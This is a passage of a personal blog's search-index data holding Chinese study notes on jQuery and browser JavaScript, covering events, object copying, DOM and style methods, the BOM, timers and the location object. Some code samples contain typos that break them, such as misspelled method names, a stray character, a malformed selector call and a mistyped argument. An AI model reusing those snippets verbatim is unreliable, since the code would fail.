$(this).css(&quot;background&quot;,&quot;skyblue&quot;); &#125;);&#125;) 2.jQuery事件处理 2.1事件处理on()绑定事件 on() 方法在匹配元素上绑定一个或多个事件处理函数 语法： 1element.on(events,[selector],fn) events：一个或多个用空格分隔的事件类型，如“click”或“keydown” selector：元素的子元素选择器 fn：回调函数 即绑定在元素身上的监听函数 123456789101112131415161718192021222324252627282930313233343536//2.事件处理on//优势1 on可以绑定1个或多个事件处理程序$(&quot;div&quot;).on(&#123; mouseenter:function()&#123; $(this).css(&quot;background&quot;,&quot;skyblue&quot;); &#125;, click:function()&#123; $(this).css(&quot;background&quot;,&quot;purple&quot;); &#125;, mouseleave:function()&#123; $(this).css(&quot;background&quot;,&quot;blue&quot;); &#125;&#125;)//优势1 if事件处理程序相同$(&quot;div&quot;).on(&quot;mouseenter mouseleave&quot;,function()&#123; $(this).toggleClass(&quot;current&quot;);&#125;)//优势2 on可以实现事件委托$(&quot;ul&quot;).on(&quot;click&quot;,&quot;li&quot;,function()&#123; alert(11);&#125;)//click 是绑在ul身上的 但是触发的对象是 ul 里面的小li//优势3 on可以给未来动态规划创建元素绑定事件$(&quot;ol li&quot;).click(function()&#123; alert(11); //因为还没有创建 所以没有办法实现&#125;)$(&quot;ol&quot;).on(&quot;click&quot;,&quot;li&quot;,function()&#123; alert(11); //可以弹出弹窗&#125;)var li = $(&quot;&lt;li&gt;这是现在才加入的li&lt;li&gt;&quot;);$(&quot;ol&quot;).sppend(li); 2.2事件处理off()解绑事件 off()方法可以移除通过on()方法添加的事件处理程序 12345$(&quot;p&quot;).off() //解绑p元素的所有事件处理程序$(&quot;p&quot;).off(&quot;click&quot;) //解绑p元素上面的点击事件 后面的fn是监听函数名$(&quot;ul&quot;).off(&quot;click&quot;,&quot;li&quot;) //解绑事件委托 如果有的事件只想触发一次，可以使用one()来绑定事件 1234567//1.事件解绑 off$(&quot;ul&quot;).off(&quot;click&quot;); //解绑ul元素上面的点击事件$(&quot;ul&quot;).off(&quot;click&quot;,&quot;li&quot;) ;//2.one()但是它只能触发事件一次$(&quot;p&quot;).one(&quot;click&quot;,function()&#123; alert(11);&#125;) 2.3自动触发事件trigger() 123456789101112//1.元素.事件()$(&quot;div&quot;).click(); //会触发元素的默认行为//2.元素 .trigger(&quot;事件&quot;)$(&quot;div&quot;).trigger(&quot;focus&quot;); //会触发元素的默认行为$(&quot;input&quot;).trigger(&quot;focus&quot;); //其默认行为 光标闪烁//3.元素.triggerHandler(&quot;事件&quot;) 就是不会触发元素默认行为$(&quot;div&quot;).triggerHandler(&quot;click&quot;);$(&quot;input&quot;).on(&quot;focus&quot;,function()&#123; $(this).val(&quot;你好&quot;);&#125;) 3.jQuery事件对象 事件被触发，就会有事件对象的产生 element.on(events,[selector],function(event)&#123;&#125;) 阻止默认行为：event.preventDefault() / return false 阻止冒泡: event.stopPropagation() 1234567$(document).on(&quot;click&quot;,function()&#123; console.log(&quot;点击了document&quot;);&#125;)$(&quot;div&quot;).on(&quot;click&quot;,function(event)&#123; console.log(&quot;点击了div&quot;); event.stopPropagation(); //if没有这个代码，则这个div点击后 会冒泡 上面的document也会打印出来&#125;)","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://shylees.github.io/tags/jQuery/"}]},{"title":"04 jQuery对象","slug":"jquery/04jQuery对象","date":"2020-09-21T16:00:00.000Z","updated":"2020-09-25T16:00:00.000Z","comments":false,"path":"learningNotes/jquery/04jQuery对象","link":"learningNotes/jquery/04jQuery对象","permalink":"https://shylees.github.io/learningNotes/jquery/04jQuery%E5%AF%B9%E8%B1%A1","excerpt":"","text":"1.jQuery对象拷贝 如果想要把某个对象拷贝（合并）给另一个对象使用，此时可以使用$.extend()方法 语法： 1$.extend([deep]，target,object1,[objectN]) deep：如果设为true 为深拷贝 ，默认false 浅拷贝 target：要拷贝的目标对象 object1：待拷贝到第一个对象的对象 objectN：待拷贝到第N个对象的对象 浅拷贝是把被拷贝的对象复杂数据类型中的地址拷贝给目标对象，修改目标对象 会影响被拷贝对象 深拷贝 前面＋true 完全克隆（拷贝的对象，而不是地址），修改目标对象不会影响被拷贝对象 1234567891011121314151617181920212223$(function()&#123; var targetObj=&#123; id:0 &#125;; var obj=&#123; id:1, name:&quot;andy&quot;， msg:&#123; //!!! age:18 &#125; &#125;; $.extend(targetObj,obj); console.log(targetObj); //会覆盖targetObj 里面原来的数据 //1.浅拷贝是把被拷贝的对象复杂数据类型中的地址拷贝给目标对象 targetObj.msg.age=20; console.log(targetObj); //msg.age=20 console.log(obj); //msg.age=20 //2.深拷贝把里面的数据完全复制一份给目标对象 如果里面有不冲突的属性 会合并到一起 $.extend(true,targetObj,obj); targetObj.msg.age=20; console.log(targetObj); //msg.age=20 console.log(obj); //msg.age=18&#125;) 2.多库共存 12345678910111213$(function()&#123; function $(ele)&#123; //把$用在这个函数上 return document.querySelector(ele); &#125; console.log($(&quot;div&quot;)); //1.如果$符号冲突 我们就用jQuery 代替$ //$.each(); 这个不能用 因为$.each()不是一个函数 $被占用 jQuery.each(); //2.让jQuery 释放对$ 的控制权 让用自己命名的东西 var suibian=jQuery.noConflict(); console.log(suibian(&quot;span&quot;)); suibian.each();&#125;) 3.jQuery插件","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://shylees.github.io/tags/jQuery/"}]},{"title":"02 jQuery常用API","slug":"jquery/02jQuery常用API","date":"2020-09-19T16:00:00.000Z","updated":"2020-10-27T16:00:00.000Z","comments":false,"path":"learningNotes/jquery/02jQuery常用API","link":"learningNotes/jquery/02jQuery常用API","permalink":"https://shylees.github.io/learningNotes/jquery/02jQuery%E5%B8%B8%E7%94%A8API","excerpt":"","text":"1 jQuery选择器 1.1jQuery基础选择器 1.2层级选择器 1.3.1 知识铺垫—jQuery设置样式 1$(&quot;div&quot;).css(&#x27;属性&#x27;,&#x27;值&#x27;) 1234567891011&lt;div&gt;div1&lt;/div&gt;&lt;div&gt;div2&lt;/div&gt;&lt;div&gt;div3&lt;/div&gt;&lt;script&gt; //1.获取四个div文件 console.log($(&quot;div&quot;)); //2.给四个div文件设置背景 jQuery对象不能应style $(&quot;div&quot;).css(&quot;background&quot;,&quot;pink&quot;); //隐式迭代 就是把所有匹配的所有元素内部进行遍历循环 给每一个元素都添加css这个方法&lt;/script&gt; 1.3.2 隐式迭代 遍历内部 DOM 元素，以为数组形式存储的过程就叫做 隐式迭代。 即：给匹配到的所有元素进行循环遍历，执行相应的方法 1.4 jQuery 筛选选择器 1234567891011121314151617181920212223&lt;!-- 二级导航 --&gt;&lt;ul class=&quot;nav&quot;&gt; &lt;li&gt; &lt;!-- 一级导航 --&gt; &lt;ul&gt; &lt;!-- 二级导航--&gt; &lt;/ul&gt; &lt;/li&gt; &lt;!-- ...--&gt;&lt;/ul&gt;&lt;script&gt; $(function()&#123; //jQuery入口函数 //鼠标经过 $(&quot;.nav&gt;li&quot;).mouseover(function()&#123; //$(this) jQuery 当前元素 this 不加引号 //show()显示元素 hide()隐藏元素 $(this).children(&quot;ul&quot;).show(); &#125;) //鼠标离开 $(&quot;.nav&gt;li&quot;).mouseout(function()&#123; $(this).children(&quot;ul&quot;).hide(); &#125;) &#125;)&lt;/script&gt; 1.5jQuery 筛选方法 注: **1. **兄弟元素siblings 除了自身元素之外的所有亲兄弟 1$(&quot;ol .item&quot;).siblings(&quot;li&quot;).css(&quot;color&quot;,&quot;red&quot;); **2.**第n个元素 1234567var index=2;//1.选择器$(&quot;ul li:eq(2)&quot;).css(&quot;color&quot;,&quot;blue&quot;);$(&quot;ul li:eq(&quot;+index+&quot;)&quot;).css(&quot;color&quot;,&quot;blue&quot;);//2.选择方法$.(&quot;ul li&quot;).eq(2).css(&quot;color&quot;,&quot;blue&quot;);$(&quot;ul li&quot;).eq(index).css(&quot;color&quot;,&quot;blue&quot;)v; **3.**判断是否有某个类名 1console.log($(&quot;div:first&quot;).hasClass(&quot;current&quot;)); **4.**父子兄关系的获取 123456//1.父 parent() 返回 最近一级的父级元素 亲爸爸console.log($(&quot;.son&quot;).parent());//2.子 亲儿子 children() 子代选择器 ul&gt;li $(&quot;.nav&quot;).children(&quot;p&quot;).css(&quot;color&quot;,&quot;red&quot;);// 所有孩子 find() 后代选择器$(&quot;.nav&quot;).find(&quot;p&quot;).css(&quot;color&quot;,&quot;red&quot;); **5.**返回指定数组的祖先元素 123456789101112&lt;div class=&quot;one&quot;&gt; &lt;div class=&quot;two&quot;&gt; &lt;div class=&quot;three&quot;&gt; &lt;div class=&quot;four&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt; console.log($(&quot;.four&quot;).parent().parent().parent()); console.log($(&quot;.four&quot;).parents()); //伪数组的形式 console.log($(&quot;.four&quot;).parents(&quot;.one&quot;)); //指定.one&lt;/script&gt; 1.6jQuery 的排他思想 利用兄弟关系 1234567//1.隐式迭代 给所有的按钮的绑定了点击事件$(&quot;button&quot;).click(function()&#123; //2.当前背景元素发生变化 $(this).css(&quot;background&quot;,&quot;pink&quot;); //3.其他兄弟去掉背景颜色 $(this).siblings(&quot;button&quot;).css(&quot;background&quot;,&quot;&quot;);&#125;) jQuery得到当前元素的索引号 $(this).index 2.jQuery的样式操作 2.1 操作css方法 123456789$(&quot;div&quot;).css(&quot;width&quot;,&quot;300px&quot;);$(&quot;div&quot;).css(&quot;width&quot;,300);//属性名 一定得加引号 否则会被认为是变量$(&quot;div&quot;).css(&#123; width:400, height:400px; backgroundColor:&quot;red&quot;;&#125;) 2.2设置类样式方法 1234567891011121314$(function()&#123; //1.添加类 addClass $(&quot;div&quot;).click(function()&#123; $(this).addClass(&quot;current&quot;); &#125;); //2.删除类 removeClass $(&quot;div&quot;).click(function()&#123; $(this).removeClass(&quot;current&quot;); &#125;); //3.切换类 toggleClass $(&quot;div&quot;).click(function()&#123; $(this).toggleClass(&quot;current&quot;); &#125;);&#125;) 12345678910//实例 点击上面的li 当前的li 添加current 类 其余兄弟移除该类$(&quot;.tab_list li&quot;).click(function()&#123; //链式编程操作 $(this).addClass(&quot;current&quot;).siblings().removeClass(&quot;current&quot;); //2.点击的同时 得到当前li的索引号 var index=$(this).index(); console.log(index); //3.让下部里面的索引号的item显示，其余的让item隐藏 $(&quot;.tab_con .item&quot;).eq(index).show().siblings().hide();&#125;); 2.3类操作与className区别 原生js中className会覆盖元素原来里面的类名 jQuery里面类操作只是对指定类进行操作，不影响原先的类名 123456789&lt;div class=&quot;one&quot;&gt;&lt;/div&gt;&lt;script&gt; var one=document.querySelector(&quot;.one&quot;); one.className=&quot;two&quot;; //这里div的类名只有two $(&quot;.one&quot;).addClass(&quot;two&quot;); //这里div的类名 有one two $(&quot;.one&quot;).removeClass(&quot;one&quot;); //这里div的类名 只有two(跟上代码一起)&lt;/script&gt; 3.jQuery效果 3.1显示隐藏效果 显示语法规范 1show([speed],[easing],[fn]) //fn 回调函数 前面做完了才会 实现的函数 隐藏语法效果 1hide([speed],[easing],[fn]) 显示隐藏切换语法效果 1toggle([speed],[easing],[fn]) 显示/隐藏/切换参数 123456789101112131415$(function()&#123; $(&quot;button&quot;).eq(0).click(function()&#123; $(&quot;div&quot;).show(1000,function()&#123; alert(1); //完成前面操作之后 弹出窗口 &#125;); &#125;) $(&quot;button&quot;).eq(0).click(function()&#123; $(&quot;div&quot;).hide(1000,function()&#123; alert(1); //完成前面操作之后 弹出窗口 &#125;); &#125;) $(&quot;button&quot;).eq(0).click(function()&#123; $(&quot;div&quot;).toggle(); //一般情况下 我们不加 参数 直接显示隐藏就ok &#125;)&#125;) 3.2滑动效果 上滑效果语法规范 1slideDown([speed],[easing],[fn]) 下滑效果语法规范 1slideUp([speed],[easing],[fn]) 滑动切换效果语法规范 1slideToggle([speed],[easing],[fn]) 上滑/下滑/切换效果参数 3.3事件切换 事件切换语法规范 1hover([over],out) ​ over : 鼠标移到元素上要触发的函数（相当于mouseenter） ​ out ：鼠标移出元素要触发的函数（相当于mouseleave） ​ hover就是鼠标经过和离开的复合写法 12345$(&quot;.nav&gt;li&quot;).hover(function()&#123; $(this).children(&quot;ul&quot;).slideDown(200);&#125;,function()&#123; $(this).children(&quot;ul&quot;).slideUp(200);&#125;); 事件切换 hover 如果只写一个函数 那么鼠标经过 离开都会触发这个函数 123$(&quot;.nav&gt;li&quot;).hover(function()&#123; $(this).children(&quot;ul&quot;).sildeToggle();&#125;) 3.4动画队列及其停止排队方法 **动画或效果队列：**动画或者效果一旦触发就会执行，如果多次触发，就造成多个动画或效果排队执行 **停止排队：**stop() ​ stop()方法用于停止动画或效果 ​ 注：stop()写到动画或者效果的前面，相当于停止结束上一次的动画 123$(&quot;.nav&gt;li&quot;).hover(function()&#123; $(this).children(&quot;ul&quot;).stop().sildeToggle();&#125;) 3.5淡入淡出效果 淡入语法规范 1fadeIn([speed],[easing],[fn]) 淡出语法规范 1fadeOut([speed],[easing],[fn]) 淡入淡出切换语法规范 1fadeToggle([speed],[easing],[fn]) 淡入淡出切换参数 渐进方式调整到指定的不透明度 1fadeTo([speed],[opacity],[easing],[fn]) 参数 123456789101112131415161718$(function()&#123; $(&quot;button&quot;).eq(0).click(function()&#123; //淡入 $(&quot;div&quot;).fadeIn(1000); &#125;); $(&quot;button&quot;).eq(1).click(function()&#123; //淡入 $(&quot;div&quot;).fadeOut(1000); &#125;); $(&quot;button&quot;).eq(2).click(function()&#123; //淡入 $(&quot;div&quot;).fadeToggle(1000); &#125;); $(&quot;button&quot;).eq(3).click(function()&#123; //淡入 $(&quot;div&quot;).fadeTo(1000,0.5); &#125;);&#125;) 12345678910//突出显示 案例$(function()&#123; //鼠标进入的时候，其他的li标签头透明度0.5 $(&quot;.wrap li&quot;).hover(function()&#123; $(this).siblings().stop().fadeTo(400,0.5); &#125;,function()&#123; //鼠标离开 其他li 透明度改为 1 $(this).siblings().stop().fadeTo(400.1); &#125;)&#125;) 3.6自定义动画 animate 语法 1animate(params,[speed],[easing],[fn]) 参数 123456$(&quot;button&quot;).click(function()&#123; $(&quot;div&quot;).animate(&#123; left:500, top:300 &#125;,500);&#125;) 4.jQuery属性操作 4.1设置或获取元素固有属性值 prop() 获取属性语法： prop(&quot;属性&quot;) 设置属性语法： prop(&quot;属性&quot;,&quot;属性值&quot;) 12345678910111213&lt;a href=&quot;&quot; title=&quot;都挺好&quot;&gt;都挺好&lt;/a&gt;&lt;input type=&quot;checkbox&quot; name=&quot;&quot; id=&quot;&quot; checked&gt;&lt;script&gt; $(function()&#123; //element.prop(&quot;属性名&quot;) 获取属性值 console.log($(&quot;a&quot;).prop(&quot;href&quot;)); $(&quot;a&quot;).prop(&quot;title&quot;,&quot;我们都挺好&quot;); $(&quot;input&quot;).change(function()&#123; console.log($(this).prop(&quot;checked&quot;)); &#125;) &#125;)&lt;/script&gt; 4.2设置或获取元素自定义属性值attr() 获取属性： attr(&quot;属性&quot;) //类似元素getAttribute() 设置属性： attr(&quot;属性&quot;,&quot;属性值&quot;) //类似原生setAttribute() 1console.log($(&quot;div&quot;),attr(&quot;index&quot;)); 4.3数据缓存data() data()方法可以在指定元素上存取数据，并不会修改DOM元素结构，一旦页面刷新，之前存放的数据都将被移除 附加数据语法： data(&quot;name&quot;,&quot;value) //向被选择元素附加数据 获取数据语法： data('name') //向被选元素获取数据 可以读取html5自定义属性data-index，得到数字型 5.jQuery内容文本值 主要针对元素的内容还有表单的值的操作 普通元素内容html() 相当于原生inner HTML html() //获取元素的内容 html(&quot;内容&quot;) //设置元素的内容 普通元素文本内容text() 相当于原生innerText text() //获取元素的文本内容 text(&quot;内容&quot;) //设置元素的文本内容 表单元素 val() val() //获取表单的值 val(&quot;内容&quot;) //设置表单内容 1234567891011//1. 获取设置元素内容 html() console.log($(&quot;div&quot;).html()); //会打印出 标签$(&quot;div&quot;).html(&quot;123&quot;) 000//2. 获取设置元素文本内容 text() console.log($(&quot;div&quot;).text()); //打印出文本$(&quot;div&quot;).text(&quot;123&quot;);//3. 获取设置表单值 val()console.log($(&quot;input&quot;).val());$(&quot;input&quot;).val(&quot;123&quot;); 6.jQuery元素操作（遍历、创建、添加、删除） 6.1遍历元素 jQuery隐式迭代是对同一类元素做同样的操作，如果想要给同一类元素做不同操作，就需要用到遍历 语法1： 1$(&quot;div&quot;).each(function(index,domEle)&#123;xxx;&#125;) each()方法遍历匹配的每一个元素，主要用DOM处理 里面的回调函数有2个参数：index是每个元素的索引号；domEle是每个DOM对象，不是jQuery对象 所以想要使用jQuery方法，需要给这个dom元素转换为jQuery对象 1234567891011$(function()&#123; var arr=[&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;]; $(&quot;div&quot;).each(function(i,domEle)&#123; //回调函数第一个参数是索引号 可以自己指定索引号名称 console.log(i); //回调函数第二个参数是dom元素对象 console.log(domEle); //domEle.css(&quot;color&quot;); dom对象没有css方法 $(domEle).css(&quot;color&quot;,arr[i]); &#125;)&#125;) 语法2： 1$.each(object,function(index,element)&#123; xxx; &#125;) $.each()方法可用于遍历任何对象，主要用于数据处理，比如数组，对象 里面的函数有2个参数：index是每个元素的索引号element遍历内容 123456789101112$.each(arr,function(i,ele)&#123; console.log(i); console.log(ele);&#125;)$.each(&#123; name:&quot;andy&quot;, age:18&#125;,function(i,ele)&#123; console.log(i); console.log(ele); &#125;) 6.2创建元素 语法： 1$(&quot;&lt;li&gt;&lt;/li&gt;&quot;); //动态创建一个li 6.3添加元素 内部添加 123element.append(&quot;内容&quot;) //把内容放入匹配元素内部 最后面 类似与appendChildelement.prepend(&quot;内容&quot;) //把内容放入匹配元素内部 最前面 外部添加 123element.after(&quot;内容&quot;) //把内容放入目标元素后面element.before(&quot;内容&quot;) //把内容放入目标元素前面 内部添加元素 生成之后 是父子关系 外部添加元素 生成之后 是兄弟关系 6.4删除元素 语法： 12345element.remove() //删除匹配的元素（本身） 自杀element.empty() //删除匹配元素集合中所有子节点 孩子element.html(&quot;&quot;) //清空匹配的元素内容 孩子 123456789101112131415161718$(function()&#123; //1.创建元素 var li=$(&quot;&lt;li&gt;我是后来创建的li&lt;/li&gt;&quot;); //2.添加元素 //（1）.内部添加 $(&quot;ul&quot;).append(li) //把内容放入匹配元素内部 最后面 类似与appendChild $(&quot;ul&quot;).prepend(li) //把内容放入匹配元素内部 最前面 //（2）.外部添加 var div=$(&quot;&lt;div&gt;我是后妈生的&lt;/div&gt;&quot;); $(&quot;.test&quot;).after(div); $(&quot;.test&quot;).before(div); //3.删除元素 $(&quot;ul&quot;).remove(); $(&quot;ul&quot;).empty(); $(&quot;ul&quot;).html(&quot;&quot;);&#125;) 7.jQuery尺寸、位置操作 7.1jQuery尺寸 1234567891011121314151617181920212223242526&lt;style&gt; div&#123; width:200px; height:200px; background-color:pink; padding:10px; border:15px solid red; margin:20px; &#125;&lt;/style&gt;&lt;script&gt; $(function()&#123; //1.width()/height() 获取设置元素 width和height大小 console.log($(&quot;div&quot;).width()); //200 //$(&quot;div&quot;).width(300); //300 //2.innerWidth() / innerHeight() 获取设置元素 width 和height ＋padding 大小 console.log($(&quot;div&quot;).innerWidth()); //220 //3.outerWidth() / outerHeight() 获取设置元素 width 和 height+padding +border 大小 console.log($(&quot;div&quot;).outerWidth()); //250 //4.outerWidth(ture) /outerHeight(true) 获取设置 width 和 height+padding+border+margin 大小 console.log($(&quot;div&quot;).outerWidth(true)); //290 &#125;)&lt;/script&gt; 7.2jQuery位置 位置主要有三个：offset ()、position()、scrollTop() / scrollLeft() 123456789101112131415161718$(function()&#123; //1.获取设置距离文档的位置(偏移) offset console.log($(&quot;.son&quot;).offset()); console.log($(&quot;.son&quot;).offset().top); $(&quot;.son&quot;).offest(&#123; top:200, left:200 &#125;); //2.获取距离大有定位父级位置（偏移）position 如果没有带有定位的父级，则以文档为准 //这个方法只能获取 不能设置 console.log($(&quot;.son&quot;).position()); //3.被卷去的头部 scrollTop() /被卷去的左侧 scrollLeft() //页面滚动事件 $(window).scroll(function() &#123; console.log($(document).scrollTop()); &#125;)&#125;) 12&lt;script&gt;&lt;/script&gt;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://shylees.github.io/tags/jQuery/"}]},{"title":"01 jQuery概述","slug":"jquery/01jQuery概述","date":"2020-09-18T16:00:00.000Z","updated":"2022-04-10T11:02:04.699Z","comments":false,"path":"learningNotes/jquery/01jQuery概述","link":"learningNotes/jquery/01jQuery概述","permalink":"https://shylees.github.io/learningNotes/jquery/01jQuery%E6%A6%82%E8%BF%B0","excerpt":"","text":"1 jQurey 概述 1.1 jQuery的概念 jQuery 是一个快速简介的 js 库，其设计宗旨是 “write less，do more”； j：js Query：查询 即是把js中的 dom 操作做了封装，使之可以快速查询使用里面的功能 jquery 封装了js常用的功能代码，优化了 DOM 操作、事件处理、动画设计、ajax交互… 学习jq的本质就是学习调用这些方法 1.2 jQuery的优点 轻量级 跨浏览器兼容 链式编程、隐式迭代 对事件、样式、动画支持，大大简化了DOM操作 支持插件扩展开发 免费开源 2 jQuery的基本使用 2.1 jQuery的下载 官方网址：https://jquery.com/ (下方右使用说明 右边有棕色的“download”，左键点击 production jQuery: 生产版本 压缩过 工作用的 development jQuery: 开发版本 无压缩 选其一 全选ctrl+A 复制 新建一文件 jquery.min.js 粘贴代码) 版本的区别 + 1x: 兼容IE 678等低版本浏览器，官网不再更新 + 2x: 不兼容IE 678等低版本浏览器，官网不再更新 + 3x: 不兼容IE 678等低版本浏览器，官方主要更新维护版本 2.2 jQuery的使用 把jq引用到html页面中的即可 1&lt;script scr=&quot;jquery.min.js&quot;&gt;&lt;/script&gt; 2.1 2.2用不了的话 用下面 1234567891011//jquery-3.3.1：字节跳动jquery压缩版引用地址: （速度快推荐！）&lt;script src=&quot;https://s3.pstatp.com/cdn/expire-1-M/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;//jquery-3.2.1：字节跳动jquery压缩版引用地址: （速度快推荐！）&lt;script src=&quot;https://s3.pstatp.com/cdn/expire-1-M/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;//jquery-1.11.3：百度压缩版引用地址: &lt;script src=&quot;https://libs.baidu.com/jquery/1.11.3/jquery.min.js&quot;&gt;&lt;/script&gt;//jquery-1.5.2：百度压缩版引用地址:&lt;script src=&quot;https://libs.baidu.com/jquery/1.5.2/jquery.min.js&quot;&gt;&lt;/script&gt; 2.3 jQuery的入口函数 123$(function()&#123; ... //此处是页面DOM加载完成的入口&#125;); 或者 123$(document).ready(function()&#123; ... //此处是页面DOM加载完成的入口&#125;); 1234//使div元素隐藏$(function()&#123; $(&#x27;div&#x27;).hide();&#125;) 2.4 jQuery的顶级对象$ $是jQuery的别称 在代码中可以用jQuery代替$ $是jQuery的顶级对象，相当于js中的window，把元素利用￥包装成jQuery对象，就可以调用看query的方法 2.5.1 jQuery对象和DOM对象 DOM对象：用原生js代码获取的对象 var myDiv=document.querySelector('div'); jQuery对象：用jQuery方式获取过来的对象 本质：通过$把DOM元素进行包装 $('div'); //获取过来是伪数组的形式 jQuery对象只能用jQuery方法 DOM对象只能用原生的js的属性和方法 两者用console.dir(myDiv)/console.dir($('div'))打印出来的结果不一样 2.5.2 jQuery对象和DOM对象的相互转换 jQuery对象与DOM对象之间是可以相互转换的，因为原生js比jQuery更大，原生的一些属性和方法jQuery没有封装，if要使用，jQuery对象就得转换为DOM对象 DOM对象转换为jQuery对象：$(DOM对象) 1234567891011&lt;video src=&quot;mov.mp4&quot;&gt;&lt;/video&gt;&lt;script&gt; $(&#x27;video&#x27;); //直接获取视频，得到jQuery对象 var myvideo = document.querySelector(&#x27;video&#x27;); //dom对象 //1.dom--&gt;jquery $(myvideo); //.play()方法 播放video js原生方法 myvideo.play() // √ //$(myvideo).play() × &lt;/script&gt; jQuery对象转换为DOM对象： $(‘div’)[index] //index是索引号 $(’div‘).get(index) //index是索引号 12345//往中间插入//2.jQuery对象转换为dom对象$(&#x27;video&#x27;)[0].play() //√ 因为$(&#x27;video&#x27;)[0]已经是dom对象$(&#x27;video&#x27;).get(0).play() //也可","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://shylees.github.io/tags/jQuery/"}]},{"title":"js bom对象概述","slug":"js/08 BOM概述","date":"2020-05-21T16:00:00.000Z","updated":"2020-05-21T16:00:00.000Z","comments":false,"path":"learningNotes/js/08 BOM概述","link":"learningNotes/js/08 BOM概述","permalink":"https://shylees.github.io/learningNotes/js/08%20BOM%E6%A6%82%E8%BF%B0","excerpt":"","text":"1.什么是BOM BOM（Browser Object Model）浏览器对象模型，它提供了独立于内容而与浏览器窗口进行交互的对象，其核心对象是 window BOM 由一系列相关的对象构成，并且每个对象都提供了很多方法和属性。 2. 与DOM相比 DOM 文档对象模型 DOM 就是把文档当作一个对象来看待 DOM 的顶级对象就是 document DOM 主要学习的是操作页面元素 DOM 是 W3C 标准规范 BOM 浏览器对象模型 把浏览器当作一个对象看待 BOM 的顶级对象是 window DOM 学习的是浏览器窗口交互的一些对象 BOM 是浏览器厂商再各自浏览器上定义的，兼容性差 3.BOM 的构成 document location navigation screen history window 对象是浏览器的顶级对象，具有： 是js访问浏览器窗口的一个接口 是一个全局对象，定义在全局作用域中的变量、函数都会变成 window对象的属性和方法 在调用时可以省略window","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js window对象常见事件","slug":"js/09 window对象","date":"2020-05-20T16:00:00.000Z","updated":"2020-05-20T16:00:00.000Z","comments":false,"path":"learningNotes/js/09 window对象","link":"learningNotes/js/09 window对象","permalink":"https://shylees.github.io/learningNotes/js/09%20window%E5%AF%B9%E8%B1%A1","excerpt":"","text":"1. 窗口加载事件：onload、DOMContentLoaded onload: 当文档内容完全加载完成时会触发该事件（包括图像、脚本、css、文件等），就调用的处理函数 DOMContentLoaded: 此事件触发时，仅当DOM加载完成，不包括样式表、图片、flash等等 ie9+ 页面图片很多，从用户访问到onload触发可能需要较长的时间，交互效果就不能实现，此时用DOMContentLoaded比较合适 ，速度较快 触发方式： 传统：window.onload=function()&#123;&#125; 只能写一次 多次 以最后一个为准 监听：window.addEventListener(&quot;load&quot;,function()&#123;&#125;); 没有次数限制 2. 调整窗口大小事件: onresize 只要窗口发生像素变化就会触发这个事件| 利用此完成响应式布局 3. 定时器：setTimeout、setInterval window.setTimeout(调用函数，[延迟的毫秒数]) : 该定时器再定时器到期后执行调用函数 window可以省略 这个调用函数可以 直接写函数 或者 写函数名 或者 采取字符串’函数名()’ 。第三种不推荐 延迟的毫秒数省略默认是，单位是毫秒 因为定时器可能有很多，所以经常给定时器赋值一个标识符 这个函数需要等待时间，时间到了才去调用这个函数，因此称回调函数 window.clearTimeout(timeout ID)：停止setTimeout()定时器： window可以省略 里面的参数就是定时器的标识符 window.setInterval(回调函数，[间隔的毫秒数]): 方法重复调用一个函数 ，每隔这个时间 就去调用一次回调函数 window可以省略 这个调用函数可以 直接写函数 或者 写函数名 或者 采取字符串’函数名()’ 三种形式 延迟的毫秒数省略默认是0，if写，必须是毫秒 因为定时器可能有很多，所以经常给定时器赋值一个标识符 window.clearInterval(interval ID): 停止setInterval()定时器 window可以省略 里面的参数就是定时器的标识符","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"js loaction、navigator、history对象概述","slug":"js/10 location对象","date":"2020-05-20T16:00:00.000Z","updated":"2020-05-20T16:00:00.000Z","comments":false,"path":"learningNotes/js/10 location对象","link":"learningNotes/js/10 location对象","permalink":"https://shylees.github.io/learningNotes/js/10%20location%E5%AF%B9%E8%B1%A1","excerpt":"","text":"1. location对象 1.1 概述 用于获取或设置窗体的 url，并且可以用于解析url，应为返回的是一个对象，所以我们将这个属性也称为location对象。 1.2 url 概述 统一资源定位器，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的url，它包含的信息指出文件的位置以及浏览器怎么处理它 一般语法为：protocol：//host[ : port]/path/[?query]#fragment http://www.itcast.c/index.html?name=andy&amp;age=18#link 通信协议 — 常用http、ftp、maito 主机（域名）— www.iteima.com 端口号 — 可选，省略时使用方案的默认端口 如http的为80 路径 — 由0或多个/隔开的字符串 一般用来表示主机上的一个目录或文件地址 参数 — 以键值对的形式 通过&amp;分隔开来 片段 — #后面内容 常见于两节 锚点 1.3 location 对象的属性 location.href — 获取或设置整个url location.host — 返回主机（域名） location.port — 返回端口号 if未写返回 得空字符串 location.pathname — 返回路径 location.search — 返回参数 location.hash — 返回片段 1.4 location 对象的方法 location.assign() 跟href一样 可以跳转页面（重定向页面） 能后退 location.replace() 替换当前页面 不记录历史 不能后退 location.reload() 重新加载页面 相当于刷新按钮或者f5 if参数为true 强之刷新 ctrl+5 2.navigator对象 包含有关浏览器的信息，它由很多属性，我们最常用的是userAgent，该属性可以返回由客户机发送服务器的use-agent头部的值 以下前端代码可以判断用户那个终端打开页面 实现跳转 12345if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|Webos|Symbian|Windows Phone)/i)))&#123; window.location.href=&quot;(页面地址)&quot;; 